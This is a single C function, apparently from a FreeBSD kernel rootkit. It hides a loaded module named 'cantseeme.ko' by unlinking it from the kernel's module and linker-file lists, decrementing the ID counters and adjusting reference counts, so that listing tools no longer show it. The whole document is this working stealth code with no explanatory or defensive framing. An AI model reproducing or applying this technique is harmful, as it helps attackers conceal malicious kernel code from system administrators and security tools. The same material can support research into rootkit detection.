static void bds_hide_module(void) {
	module_t mod;
	linker_file_t lf;
	
	mtx_lock(&Giant);
	TAILQ_FOREACH(mod, &modules, link) {
		if (strcmp(mod->file->filename, "cantseeme.ko") == 0) {
			TAILQ_REMOVE(&modules, mod, link);
			nextid--;
			break;
		}
	}
	mtx_unlock(&Giant);
	sx_xlock(&kld_sx);
	TAILQ_FOREACH(lf, &linker_files, link) {
		if (strcmp(lf->filename, "cantseeme.ko") == 0) {
			TAILQ_REMOVE(&linker_files, lf, link);
			next_file_id--;
			break;
		}
	}
	sx_xunlock(&kld_sx);
	linker_kernel_file->refs--;
}
